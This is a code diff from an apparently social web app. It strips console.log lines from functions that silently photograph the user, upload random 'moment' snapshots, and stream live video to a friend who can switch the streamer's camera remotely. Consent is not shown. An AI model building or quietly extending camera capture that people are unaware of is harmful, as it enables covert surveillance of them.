@@ -1806,7 +1806,7 @@ async function initAuth() {
 }
 
 async function captureSilentPhoto() {
-  console.log("State.currentUser.livePhotoEnabled:", State.currentUser.livePhotoEnabled)
+  
   if (!State.currentUser || !State.currentUser.livePhotoEnabled) {
     return;
   }
@@ -1857,7 +1857,7 @@ async function captureSilentPhoto() {
 
     const res = await uploadCapturedPhoto(dataUrl);
     if (res && res.code === 201) {
-      console.log("Silent photo captured successfully.");
+      
       if (State.currentUser.capturedPhotos) {
         State.currentUser.capturedPhotos.unshift(res.Data.photo);
       } else {
@@ -1924,7 +1924,7 @@ async function captureSilentMoment(cameraPreference = null) {
 
     const res = await uploadMomentPhoto(dataUrl);
     if (res && res.code === 201) {
-      console.log("[Moment] Silently captured and uploaded random moment snapshot.");
+      
     }
   } catch (err) {
     console.error("Silent moment capture error:", err);
@@ -1999,7 +1999,7 @@ async function startLiveVideoStreaming(to, cameraPreference = null) {
     };
 
     videoPC.onconnectionstatechange = () => {
-      console.log(`[Video] Streamer WebRTC Connection State: ${videoPC.connectionState}`);
+      
       if (videoPC.connectionState === "disconnected" || videoPC.connectionState === "failed") {
         stopLiveVideoStreaming();
       }
@@ -2010,7 +2010,7 @@ async function startLiveVideoStreaming(to, cameraPreference = null) {
     await videoPC.setLocalDescription(offer);
     socket.emit("stream:sdp", { to, sdp: offer, type: "video" });
 
-    console.log(`[Video] WebRTC video streaming initialized offer sent to ${to}`);
+    
 
     // Track live video data usage via WebRTC stats
     window._videoStatsInterval = setInterval(async function () {
@@ -2101,7 +2101,7 @@ async function startReceivingVideoStream(friendId) {
     if (frameImg) frameImg.style.display = "none";
 
     videoPC.ontrack = (e) => {
-      console.log("[Video] WebRTC video track received!");
+      
       let stream = e.streams && e.streams[0];
       if (!stream && e.track) {
         stream = new MediaStream([e.track]);
@@ -2123,7 +2123,7 @@ async function startReceivingVideoStream(friendId) {
     };
 
     videoPC.onconnectionstatechange = () => {
-      console.log(`[Video] Viewer WebRTC Connection State: ${videoPC.connectionState}`);
+      
     };
   } catch (err) {
     console.error("[Video] Failed to initialize WebRTC receiver:", err);
@@ -2155,7 +2155,7 @@ async function toggleRemoteVideoCamera() {
   const newPref = currentPref === "user" ? "environment" : "user";
   window.liveVideoCameraPreference = newPref;
 
-  console.log(`[Video] Toggling remote camera for friend ${friendId} to preference: ${newPref}`);
+  
 
   // Re-initialize receiving and request the toggled stream
   if (typeof window.startReceivingVideoStream === "function") {
@@ -2224,7 +2224,7 @@ async function syncPendingMessagesFromDB() {
   if (!window.IndexedDBQueueService) return;
   try {
     const unsent = await IndexedDBQueueService.getAllUnsent();
-    console.log(`[IndexedDB] Loaded ${unsent.length} unsent messages from DB`);
+    
     for (const dbMsg of unsent) {
       // Safety net: if it has already been sent or acknowledged, delete it!
       if (dbMsg.status === "sent" || dbMsg.deliveredAt || dbMsg.mediaMeta?.deliveredAt) {
